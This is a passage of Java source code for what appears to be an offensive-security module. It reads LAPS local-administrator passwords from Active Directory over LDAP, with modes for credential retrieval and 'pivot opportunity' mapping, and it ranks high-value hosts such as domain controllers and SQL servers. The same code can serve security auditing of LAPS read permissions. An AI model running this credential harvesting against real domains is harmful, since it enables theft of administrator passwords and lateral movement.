        if (config.useKerberos) {
            return "kerberos";
        }
        if (!config.username.isBlank()) {
            return "simple_bind";
        }
        return "anonymous";
    }

    private String buildLdapFilter(ModuleConfig config) {
        StringBuilder filter = new StringBuilder("(&(objectCategory=computer)(objectClass=computer)");

        if (config.mode != ModuleMode.HOST_CONFIRMATION) {
            if (config.classicOnly) {
                filter.append("(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*))");
            } else if (config.lapsV2Only) {
                filter.append("(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)(msLAPS-PasswordExpirationTime=*))");
            } else {
                filter.append("(|")
                    .append("(ms-Mcs-AdmPwd=*)")
                    .append("(ms-Mcs-AdmPwdExpirationTime=*)")
                    .append("(msLAPS-Password=*)")
                    .append("(msLAPS-EncryptedPassword=*)")
                    .append("(msLAPS-PasswordExpirationTime=*)")
                    .append(")");
            }
        }

        if (config.mode == ModuleMode.HOST_CONFIRMATION && !config.focusHost.isBlank()) {
            String escaped = escapeFilterValue(stripTrailingDollar(config.focusHost));
            filter.append("(|")
                .append("(dNSHostName=").append(escaped).append(")")
                .append("(sAMAccountName=").append(escaped).append("$)")
                .append("(name=").append(escaped).append(")")
                .append("(cn=").append(escaped).append(")")
                .append(")");
        }

        filter.append(")");
        return filter.toString();
    }

    private ModuleConfig parseConfig(Map<String, String> input) {
        ModuleConfig config = new ModuleConfig();

        LegacyTargetInput parsedLegacy = parseLegacyTarget(firstNonBlank(input.get("target"), ""));

        config.mode = ModuleMode.fromInput(firstNonBlank(input.get("mode"), "laps_inventory"));
        config.target = firstNonBlank(parsedLegacy.target, input.get("domain"), input.get("dc_ip"));
        config.dcIp = trim(input.get("dc_ip"));
        config.baseDn = trim(input.get("base_dn"));

        config.username = firstNonBlank(input.get("username"), parsedLegacy.username);
        config.password = firstNonBlank(input.get("password"), parsedLegacy.password);
        config.hashes = trim(input.get("hashes"));
        config.useKerberos = parseBoolean(input.get("use_kerberos"), false);
        config.aesKey = trim(input.get("aes_key"));

        config.useLdaps = parseBoolean(input.get("use_ldaps"), false);
        int defaultPort = config.useLdaps ? DEFAULT_LDAPS_PORT : DEFAULT_LDAP_PORT;
        config.ldapPort = parseInteger(input.get("ldap_port"), defaultPort);
        config.connectTimeoutMs = parseInteger(input.get("connect_timeout_ms"), DEFAULT_CONNECT_TIMEOUT_MS);
        config.readTimeoutMs = parseInteger(input.get("read_timeout_ms"), DEFAULT_READ_TIMEOUT_MS);
        config.maxResults = parseInteger(input.get("max_results"), DEFAULT_MAX_RESULTS);

        config.classicOnly = parseBoolean(input.get("classic_only"), false);
        config.lapsV2Only = parseBoolean(input.get("lapsv2_only"), false);
        config.includeUnreadable = parseBoolean(input.get("include_unreadable"), true);
        config.includeExpired = parseBoolean(input.get("include_expired"), true);
        config.resolveDns = parseBoolean(input.get("resolve_dns"), false);
        config.hostnameFilter = trim(input.get("hostname_filter"));
        config.defaultLocalAdmin = firstNonBlank(input.get("default_local_admin"), DEFAULT_LOCAL_ADMIN_ACCOUNT);

        config.focusHost = firstNonBlank(input.get("focus_host"), input.get("identify_target"));
        return config;
    }

    private List<String> validateConfig(ModuleConfig config) {
        List<String> errors = new ArrayList<>();

        if (config.target.isBlank()) {
            errors.add("target is required");
        }

        if (config.mode == ModuleMode.HOST_CONFIRMATION && config.focusHost.isBlank()) {
            errors.add("focus_host is required when mode=host_confirmation");
        }

        if (config.classicOnly && config.lapsV2Only) {
            errors.add("classic_only and lapsv2_only cannot both be true");
        }

        if (config.username.isBlank() && !config.password.isBlank()) {
            errors.add("username is required when password is provided");
        }

        if (!config.username.isBlank() && config.password.isBlank() && !config.useKerberos) {
            if (!config.hashes.isBlank()) {
                errors.add("hash-only LDAP bind is unsupported in Java LDAP path; use password or Kerberos");
            } else {
                errors.add("password is required for simple bind when username is provided");
            }
        }

        if (config.ldapPort < 1 || config.ldapPort > 65535) {
            errors.add("ldap_port must be between 1 and 65535");
        }

        if (config.connectTimeoutMs < 1 || config.connectTimeoutMs > 300_000) {
            errors.add("connect_timeout_ms must be between 1 and 300000");
        }

        if (config.readTimeoutMs < 1 || config.readTimeoutMs > 300_000) {
            errors.add("read_timeout_ms must be between 1 and 300000");
        }

        if (config.maxResults < 1 || config.maxResults > MAX_ALLOWED_RESULTS) {
            errors.add("max_results must be between 1 and " + MAX_ALLOWED_RESULTS);
        }

        return errors;
    }

    private int compareRecords(LapsRecord left, LapsRecord right) {
        int scoreDiff = Integer.compare(right.riskScore, left.riskScore);
        if (scoreDiff != 0) {
            return scoreDiff;
        }

        String leftHost = firstNonBlank(left.dnsHostName, left.computerName);
        String rightHost = firstNonBlank(right.dnsHostName, right.computerName);
        return leftHost.compareToIgnoreCase(rightHost);
    }

    private String buildLdapUrl(ModuleConfig config) {
        String host = !config.dcIp.isBlank() ? config.dcIp : config.target;
        String scheme = config.useLdaps ? "ldaps" : "ldap";
        return scheme + "://" + host + ":" + config.ldapPort;
    }

    private String normalizePrincipal(String username, String target) {
        String user = trim(username);
        if (user.isBlank()) {
            return "";
        }
        if (user.contains("\\") || user.contains("@")) {
            return user;
        }
        if (looksLikeDomainName(target)) {
            return user + "@" + target;
        }
        return user;
    }

    private String domainToBaseDn(String domain) {
        List<String> labels = new ArrayList<>();
        for (String part : domain.split("\\.")) {
            String token = part.trim();
            if (!token.isBlank()) {
                labels.add("DC=" + token);
            }
        }
        return String.join(",", labels);
    }

    private String baseDnToDomain(String baseDn) {
        List<String> labels = new ArrayList<>();
        for (String token : baseDn.split(",")) {
            String part = token.trim();
            if (part.regionMatches(true, 0, "DC=", 0, 3) && part.length() > 3) {
                labels.add(part.substring(3));
            }
        }
        return String.join(".", labels);
    }

    private boolean looksLikeDomainName(String candidate) {
        String value = trim(candidate);
        return !value.isBlank() && value.contains(".") && !value.contains(" ");
    }

    private String stripTrailingDollar(String value) {
        String token = trim(value);
        if (token.endsWith("$") && token.length() > 1) {
            return token.substring(0, token.length() - 1);
        }
        return token;
    }

    private String normalizeFocus(String value) {
        return stripTrailingDollar(trim(value)).toLowerCase(Locale.ROOT);
    }

    private boolean wildcardMatches(String value, String wildcard) {
        String candidate = firstNonBlank(value).toLowerCase(Locale.ROOT);
        String pattern = firstNonBlank(wildcard).toLowerCase(Locale.ROOT);
        if (pattern.isBlank()) {
            return true;
        }

        String regex = pattern
            .replace(".", "\\\\.")
            .replace("*", ".*")
            .replace("?", ".");
        return candidate.matches(regex);
    }

    private String parseLapsV2JsonValue(String raw, Pattern pattern) {
        String value = trim(raw);
        if (value.isBlank()) {
            return "";
        }

        Matcher matcher = pattern.matcher(value);
        if (!matcher.find()) {
            return "";
        }

        return matcher.group(1)
            .replace("\\\\", "\\")
            .replace("\\\"", "\"");
    }

    private boolean isHighValueHost(LapsRecord record) {
        String os = firstNonBlank(record.operatingSystem).toLowerCase(Locale.ROOT);
        String host = firstNonBlank(record.dnsHostName, record.computerName).toLowerCase(Locale.ROOT);

        if (os.contains("server")) {
            return true;
        }

        return host.contains("dc")
            || host.contains("sql")
            || host.contains("exchange")
            || host.contains("file")
            || host.contains("fs");
    }

    private String inferReadAssessment(LapsRecord record) {
        return switch (record.retrievalState) {
            case PLAINTEXT -> "plaintext_laps_password_readable";
            case ENCRYPTED_ONLY -> "encrypted_laps_blob_readable_plaintext_not_visible";
            case METADATA_ONLY -> "laps_metadata_visible_password_not_retrievable_likely_acl_or_variant";
            case NOT_MANAGED -> "no_laps_attributes_detected";
        };
    }

    private List<String> buildRiskTags(LapsRecord record) {
        List<String> tags = new ArrayList<>();
        if (record.credentialRetrievable) {
            tags.add("plaintext_credential_exposure");
        }
        if (record.retrievalState == RetrievalState.ENCRYPTED_ONLY) {
            tags.add("encrypted_password_exposure");
        }
        if (record.retrievalState == RetrievalState.METADATA_ONLY) {
            tags.add("metadata_only_exposure");
        }
        if (record.highValueHost) {
            tags.add("high_value_host");
        }
        if (record.passwordExpired) {
            tags.add("password_expired");
        }
        if (record.daysUntilExpiry != null && record.daysUntilExpiry >= 0 && record.daysUntilExpiry <= 7) {
            tags.add("password_expiring_soon");
        }
        if (!record.localAdminAccount.equalsIgnoreCase(DEFAULT_LOCAL_ADMIN_ACCOUNT)) {
            tags.add("custom_local_admin_account");
        }
        if (record.classicManaged) {
            tags.add("classic_laps_signal");
        }
        if (record.lapsV2Managed) {
            tags.add("lapsv2_signal");
        }
        return tags;
    }

    private int scoreRecord(LapsRecord record) {
        int score = 10;

        if (record.credentialRetrievable) {
            score += 55;
        }
        if (record.retrievalState == RetrievalState.ENCRYPTED_ONLY) {
            score += 25;
        }
        if (record.retrievalState == RetrievalState.METADATA_ONLY) {
            score += 12;
        }
        if (record.highValueHost) {
            score += 20;
        }
        if (record.passwordExpired) {
            score += 3;
        }
        if (record.daysUntilExpiry != null && record.daysUntilExpiry >= 0 && record.daysUntilExpiry <= 7) {
            score += 10;
        }

        return Math.max(0, Math.min(100, score));
    }

    private String riskLevel(int score) {
        if (score >= 75) {
            return "high";
        }
        if (score >= 50) {
            return "medium";
        }
        if (score >= 25) {
            return "low";
        }
        return "info";
    }

    private String fileTimeToIso(long fileTime) {
        if (fileTime <= 0) {
            return "";
        }
        try {
            long seconds = (fileTime / 10_000_000L) - AD_EPOCH_DIFF_SECONDS;
            if (seconds <= 0) {
                return "";
            }
            return ISO_FMT.format(Instant.ofEpochSecond(seconds).atOffset(ZoneOffset.UTC));
        } catch (Exception e) {
            return "";
        }
    }

    private Long computeDaysUntilExpiry(long fileTime) {
        if (fileTime <= 0) {
            return null;
        }
        try {
            long expirySeconds = (fileTime / 10_000_000L) - AD_EPOCH_DIFF_SECONDS;
            if (expirySeconds <= 0) {
                return null;
            }
            long nowSeconds = Instant.now().getEpochSecond();
            return (expirySeconds - nowSeconds) / 86_400L;
        } catch (Exception e) {
            return null;
        }
    }

    private long firstNonZero(long first, long second) {
        if (first > 0) {
            return first;
        }
        if (second > 0) {
            return second;
        }
        return 0L;
    }

    private String getStringAttribute(Attributes attrs, String name) throws NamingException {
        Attribute attr = attrs.get(name);
        if (attr == null || attr.size() == 0) {
            return "";
        }

        Object value = attr.get();
        return value == null ? "" : String.valueOf(value).trim();
    }

    private String safeNameInNamespace(SearchResult result) {
        try {
            return result.getNameInNamespace();
        } catch (Exception e) {
            return "";
        }
    }

    private LegacyTargetInput parseLegacyTarget(String target) {
        LegacyTargetInput parsed = new LegacyTargetInput();
        String value = trim(target);
        if (value.isBlank()) {
            return parsed;
        }

        if (!value.contains("/") && !value.contains(":")) {
            parsed.target = value;
            return parsed;
        }

        String[] slash = value.split("/", 2);
        parsed.target = slash.length > 0 ? slash[0].trim() : "";
        if (slash.length == 2) {
            String credentials = slash[1].trim();
            String[] userPass = credentials.split(":", 2);
            parsed.username = userPass.length > 0 ? userPass[0].trim() : "";
            parsed.password = userPass.length > 1 ? userPass[1].trim() : "";
        }
        return parsed;
    }

    private String escapeFilterValue(String value) {
        String raw = value == null ? "" : value;
        StringBuilder sb = new StringBuilder(raw.length());
        for (char c : raw.toCharArray()) {
            switch (c) {
                case '*' -> sb.append("\\2a");
                case '(' -> sb.append("\\28");
                case ')' -> sb.append("\\29");
                case '\\' -> sb.append("\\5c");
                case '\0' -> sb.append("\\00");
                default -> sb.append(c);
            }
        }
        return sb.toString();
    }

    private int parseInteger(String value, int defaultValue) {
        String token = trim(value);
        if (token.isBlank()) {
            return defaultValue;
        }
        try {
            return Integer.parseInt(token);
        } catch (NumberFormatException e) {
            return defaultValue;
        }
    }

    private long parseLong(String value, long defaultValue) {
        String token = trim(value);
        if (token.isBlank()) {
            return defaultValue;
        }
        try {
            return Long.parseLong(token);
        } catch (NumberFormatException e) {
            return defaultValue;
        }
    }

    private boolean parseBoolean(String value, boolean defaultValue) {
        String token = trim(value);
        if (token.isBlank()) {
            return defaultValue;
        }
        return Boolean.parseBoolean(token);
    }

    private String firstNonBlank(String... values) {
        for (String value : values) {
            if (value != null && !value.trim().isBlank()) {
                return value.trim();
            }
        }
        return "";
    }

    private String trim(String value) {
        return value == null ? "" : value.trim();
    }

    private void closeQuietly(LdapContext ldap) {
        if (ldap != null) {
            try {
                ldap.close();
            } catch (Exception ignored) {
                // no-op
            }
        }
    }

    protected static class ModuleConfig {
        protected ModuleMode mode = ModuleMode.LAPS_INVENTORY;

        protected String target = "";
        protected String dcIp = "";
        protected String baseDn = "";

        protected String username = "";
        protected String password = "";
        protected String hashes = "";
        protected boolean useKerberos;
        protected String aesKey = "";

        protected boolean useLdaps;
        protected int ldapPort = DEFAULT_LDAP_PORT;
        protected int connectTimeoutMs = DEFAULT_CONNECT_TIMEOUT_MS;
        protected int readTimeoutMs = DEFAULT_READ_TIMEOUT_MS;
        protected int maxResults = DEFAULT_MAX_RESULTS;

        protected boolean classicOnly;
        protected boolean lapsV2Only;
        protected boolean includeUnreadable = true;
        protected boolean includeExpired = true;
        protected boolean resolveDns;
        protected String hostnameFilter = "";
        protected String defaultLocalAdmin = DEFAULT_LOCAL_ADMIN_ACCOUNT;

        protected String focusHost = "";
    }

    protected enum ModuleMode {
        LAPS_INVENTORY("laps_inventory", "laps_inventory_result"),
        CREDENTIAL_RETRIEVAL("credential_retrieval", "credential_retrieval_result"),
        PIVOT_OPPORTUNITY_MAP("pivot_opportunity_map", "pivot_opportunity_map_result"),
        HOST_CONFIRMATION("host_confirmation", "host_confirmation_result");

        private final String value;
        private final String resultKey;

        ModuleMode(String value, String resultKey) {
            this.value = value;
            this.resultKey = resultKey;
        }

        private static ModuleMode fromInput(String raw) {
            String normalized = raw == null
                ? ""
                : raw.trim().toLowerCase(Locale.ROOT).replace('-', '_').replace(' ', '_');

            return switch (normalized) {
                case "credential_retrieval", "retrieval", "read_passwords" -> CREDENTIAL_RETRIEVAL;
                case "pivot_opportunity_map", "pivot", "reuse_analysis" -> PIVOT_OPPORTUNITY_MAP;
                case "host_confirmation", "identify", "identification" -> HOST_CONFIRMATION;
                default -> LAPS_INVENTORY;
            };
        }
    }

    protected enum RetrievalState {
        PLAINTEXT("plaintext_retrievable"),
        ENCRYPTED_ONLY("encrypted_only"),
        METADATA_ONLY("metadata_only"),
        NOT_MANAGED("not_laps_managed");

        private final String value;

        RetrievalState(String value) {
            this.value = value;
        }
    }

    protected static class LapsRecord {
        protected String computerName = "";
        protected String samAccountName = "";
        protected String dnsHostName = "";
        protected String resolvedDnsName = "";
        protected String operatingSystem = "";
        protected String distinguishedName = "";

        protected String classicPassword = "";
        protected long classicExpirationRaw;

        protected String lapsV2PasswordRaw = "";
        protected String lapsV2ParsedPassword = "";
        protected String lapsV2ParsedAccount = "";
        protected String lapsV2EncryptedPassword = "";
        protected long lapsV2ExpirationRaw;

        protected boolean classicManaged;
        protected boolean lapsV2Managed;

        protected String lapsVersion = "none";
        protected RetrievalState retrievalState = RetrievalState.NOT_MANAGED;

        protected boolean credentialRetrievable;
        protected String plaintextPassword = "";
        protected String passwordSource = "";
        protected String localAdminAccount = DEFAULT_LOCAL_ADMIN_ACCOUNT;

        protected long selectedExpirationRaw;
        protected String passwordExpiration = "";
        protected Long daysUntilExpiry;
        protected boolean passwordExpired;

        protected boolean highValueHost;
        protected String readAssessment = "";

        protected int riskScore;
        protected String riskLevel = "info";
        protected List<String> riskTags = new ArrayList<>();

        protected boolean hasAnyLapsSignal() {
            return classicManaged || lapsV2Managed;
        }
    }

    private static final class LegacyTargetInput {
        private String target = "";
        private String username = "";
        private String password = "";
    }
}
